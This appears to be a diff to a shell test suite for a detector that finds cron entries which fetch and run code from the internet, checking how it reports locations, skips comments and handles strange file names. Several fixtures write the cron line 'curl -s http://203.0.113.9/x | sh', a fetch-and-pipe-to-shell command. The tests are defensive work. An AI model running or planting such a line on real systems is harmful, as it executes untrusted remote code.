@@ -43,7 +43,29 @@ setup() {
 }
 
 @test "cron spool: the scheduling inventory reads the same spool directory" {
-    printf '*/5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/deploy"
+    printf '# header\n*/5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/deploy"
     run _sched_find_internet_fetch_in_cron
-    [[ "$output" == *"user crontab (deploy): "*"curl -s http://203.0.113.9/x | sh"* ]]
+    [[ "$output" == *"$SPOOL_DIR/deploy:2"* ]]
+    # A location, never the entry: cron lines carry tokens.
+    [[ "$output" != *"203.0.113.9"* ]]
+}
+
+@test "cron spool: a commented-out fetch is not reported" {
+    printf '# */5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/deploy"
+    run _sched_find_internet_fetch_in_cron
+    [[ "$output" != *"$SPOOL_DIR/deploy"* ]]
+}
+
+@test "cron spool: a file name that is not valid sed still has its entries read" {
+    # Same loop as /etc/cron.d, where cronie runs a file named a|b. A name spliced
+    # into a sed program made sed fail and the file's entries, and the finding, vanish.
+    printf '*/5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/a|b&c\\d"
+    run _sched_find_internet_fetch_in_cron
+    [ "$output" = "$SPOOL_DIR/a|b&c\\d:1" ]
+}
+
+@test "cron spool: a fetch is matched in the entry, not in the file name" {
+    printf '* * * * * echo hi | sh\n' > "$SPOOL_DIR/curl-checker"
+    run _sched_find_internet_fetch_in_cron
+    [ -z "$output" ]
 }
